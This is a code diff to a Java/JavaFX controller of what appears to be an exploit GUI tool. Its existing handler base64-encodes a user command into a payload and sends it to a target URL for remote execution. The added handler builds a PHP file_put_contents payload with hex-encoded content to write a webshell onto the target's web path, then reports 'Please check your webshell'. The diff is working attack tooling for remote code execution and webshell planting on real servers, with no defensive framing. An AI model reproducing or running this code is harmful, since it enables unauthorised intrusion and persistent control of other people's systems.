@@ -14,15 +14,15 @@ import java.net.Proxy;
 public class Controller {
 
     @FXML
-    public TextArea Info_Tb;
-    public TextField Target_Tb;
-    public TextField Cmd_Tb;
-    public String Target,Cmd,Payload;
+    public TextArea Info_Tb,Shell_Tb,Output_Tb;
+    public TextField Target_Tb,Cmd_Tb,Wpath_Tb,Name_Tb;
+    public String Target,Cmd,Payload,WebPath,Name,ShellContext;
     //public Proxy proxy;
+
+
 
     @FXML
     private void Exp_btnAction(ActionEvent event) throws Exception {
-        //Info_Tb.appendText(Target_Tb.getText()+Name_Tb.getText()+Password_Tb.getText());
         Request request =new Request();
         Target = Target_Tb.getText().trim();
         Cmd = Cmd_Tb.getText().trim();
@@ -36,6 +36,33 @@ public class Controller {
         else {
             Cmd = encryptBASE64(String.format(Payload,Cmd)).replace("\r\n", "");
             Info_Tb.setText(request.sendGet(Target,"", null, Cmd));
+        }
+    }
+
+    @FXML
+    private  void F_btnAction(ActionEvent event) throws Exception{
+        Request request =new Request();
+        Target = Target_Tb.getText().trim();
+        WebPath = Wpath_Tb.getText().trim();
+        Name = Name_Tb.getText().trim();
+        ShellContext = Shell_Tb.getText().trim();
+        Payload = "file_put_contents(\"%s\", hex2bin(\"%s\"), LOCK_EX);";
+        //proxy = request.setProxy("127.0.0.1",8080);
+        if (Target.isEmpty() || WebPath.isEmpty() || Name.isEmpty() || ShellContext.isEmpty()){
+            Alert error = new Alert(Alert.AlertType.ERROR,"参数格式不合规,请检查后重试！");
+            error.setHeaderText("参数不合规");
+            error.show();
+        }
+        else {
+            Payload = String.format(Payload,WebPath+Name,Convert.Str2Hex(ShellContext));
+            Cmd = encryptBASE64(Payload).replace("\r\n", "");
+            if ((request.sendGet(Target,"", null, Cmd)).length() == 0){
+                Output_Tb.setText("Success done, Please check your webshell !");
+            }
+            else {
+                Output_Tb.setText(request.sendGet(Target, "", null, Cmd));
+            }
+
         }
     }
 
